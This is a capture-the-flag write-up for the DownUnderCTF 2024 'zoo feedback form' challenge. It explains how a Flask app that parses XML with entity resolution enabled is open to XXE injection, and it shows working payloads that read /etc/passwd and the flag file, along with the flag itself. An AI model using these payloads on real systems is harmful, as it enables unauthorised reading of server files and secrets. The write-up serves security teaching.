# zoo feedback form

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 693 solves / 100 points
- Author: @richighimi
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

Author: richighimi

[https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev](https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708161124.png)

In here, we can submit feedback to the Zoo.

Let's try to submit some random inputs:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708161226.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708161235.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708161253.png)

When we clicked the "Submit Feedback" button, it'll send a POST request to `/` with an XML body data.

There's not much we can do in here! Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/zoo-feedback-form/zoo-feedback-form.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/zoo-feedback-form)-[2024.07.08|16:14:01(HKT)]
└> file zoo-feedback-form.zip 
zoo-feedback-form.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/zoo-feedback-form)-[2024.07.08|16:14:02(HKT)]
└> unzip zoo-feedback-form.zip 
Archive:  zoo-feedback-form.zip
   creating: zoo-feedback-form/
  inflating: zoo-feedback-form/Dockerfile  
   creating: zoo-feedback-form/main-app/
 extracting: zoo-feedback-form/main-app/flag.txt  
   creating: zoo-feedback-form/main-app/static/
  inflating: zoo-feedback-form/main-app/static/styles.css  
   creating: zoo-feedback-form/main-app/templates/
  inflating: zoo-feedback-form/main-app/templates/index.html  
  inflating: zoo-feedback-form/main-app/app.py  
  inflating: zoo-feedback-form/requirements.txt  
```

After reviewing the source code, we have the following findings:

1. This web application uses Python's Flask web application framework and XML to handle data.
2. There's no routes (Endpoints) to read the flag.

Now, let's dive into this web application's main logic, `zoo-feedback-form/main-app/app.py`!

```python
from flask import Flask, request, render_template_string, render_template
from lxml import etree

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        xml_data = request.data
        try:
            parser = etree.XMLParser(resolve_entities=True)
            root = etree.fromstring(xml_data, parser=parser)
        except etree.XMLSyntaxError as e:
            return render_template_string('<div style="color:red;">Error parsing XML: {{ error }}</div>', error=str(e))
        feedback_element = root.find('feedback')
        if feedback_element is not None:
            feedback = feedback_element.text
            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback)
        else:
            return render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>')

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

In here, we can see that the POST route parses our XML data using library `lxml`.

After parsing our XML data, it'll get the `<feedback>` element's text inside the `<root>` element and use Jinja template engine to render our `<feedback>` element's text.

When reviewing source code, if the web application uses XML to process data, it's susceptible to be vulnerable for **XML External Entity (XXE) Injection**.

In the application's XML parser (`etree.XMLParser`), the `resolve_entities` is set to `True`. As the name suggested, **the XML parser will replace entities by their text value, which is vulnerable to XXE**!

> Note: XML entities can be used to tell the XML parser to fetch specific content on the web server.

## Exploitation

With the above knowledge, we can try to exploit the XXE vulnerability to **read arbitrary file** from the server's filesystem with the following payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root>
    <feedback>&xxe;</feedback>
</root>
```

In this payload, we defines an external entity called `&xxe;` with the value of file `/etc/passwd`.

Let's try the above payload!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708163209.png)

Nice! It worked!

Let's read the flag file this time!

But wait, where's the flag file location?

**If we look at `zoo-feedback-form/Dockerfile`, the web application's directory is at `/app` (`WORKDIR /app`):**
```bash
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .

RUN pip install -r requirements.txt

COPY main-app/ .

EXPOSE 80

CMD [ "python", "app.py" ]
```

**Hence, the flag file is at `/app/flag.txt`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///app/flag.txt'>]>
<root>
    <feedback>&xxe;</feedback>
</root>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708163514.png)

- **Flag: `DUCTF{emU_say$_he!!0_h0!@_ci@0}`**

## Conclusion

What we've learned:

1. XML External Entity (XXE) injection